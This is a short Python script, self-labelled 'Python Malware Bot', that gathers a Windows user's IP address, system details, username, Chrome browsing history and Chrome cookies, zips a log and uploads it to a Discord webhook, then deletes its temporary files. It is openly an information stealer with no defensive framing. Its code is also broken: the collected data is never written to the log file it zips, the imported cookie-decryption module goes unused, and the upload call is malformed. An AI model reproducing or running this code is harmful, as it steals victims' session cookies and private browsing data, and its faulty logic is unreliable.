# Discord webhook URL
DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"

import os
import socket
import platform
import subprocess
import getpass
import shutil
import glob
import datetime
import sqlite3
import win32crypt
import zipfile
import requests

# Function to retrieve IP address
def get_ip_address():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address

# Function to retrieve system information
def get_system_info():
    system_info = platform.uname()
    return system_info

# Function to retrieve user information
def get_user_info():
    username = getpass.getuser()
    return username

# Function to retrieve browser history
def get_browser_history():
    data_path = os.path.expanduser('~') + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\"
    history_db = os.path.join(data_path, 'history')
    shutil.copy2(history_db, "history.db")

    # Connect to the database
    conn = sqlite3.connect("history.db")
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM urls")
    rows = cursor.fetchall()
    
    history_list = []
    for row in rows:
        history_list.append(row[1])
    
    conn.close()
    os.remove("history.db")

    return history_list

# Function to retrieve cookies
def get_browser_cookies():
    data_path = os.path.expanduser('~') + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\"
    cookie_db = os.path.join(data_path, 'Cookies')
    shutil.copy2(cookie_db, "cookies.db")

    # Connect to the database
    conn = sqlite3.connect("cookies.db")
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM cookies")
    rows = cursor.fetchall()

    cookies_list = []
    for row in rows:
        cookies_list.append(row[1])
    
    conn.close()
    os.remove("cookies.db")

    return cookies_list

# Function to log gathered information
def log_info_and_send():
    ip_address = get_ip_address()
    system_info = get_system_info()
    user_info = get_user_info()
    browser_history = get_browser_history()
    browser_cookies = get_browser_cookies()

    # Create a ZIP file
    zip_filename = "logs.zip"
    with zipfile.ZipFile(zip_filename, 'w') as zipf:
        zipf.write("log.txt")
    
    # Send ZIP file to Discord webhook
    with open(zip_filename, 'rb') as file:
        payload = {
            "content": "Here are the logs as requested:",
            "username": "Python Malware Bot",
            "file": file.read()
        }
        requests.post(DISCORD_WEBHOOK_URL, files=payload)
    
    # Delete temporary files
    os.remove("log.txt")
    os.remove(zip_filename)

    print("Logs sent to Discord successfully.")

# Main function
def main():
    log_info_and_send()

if __name__ == "__main__":
    main()
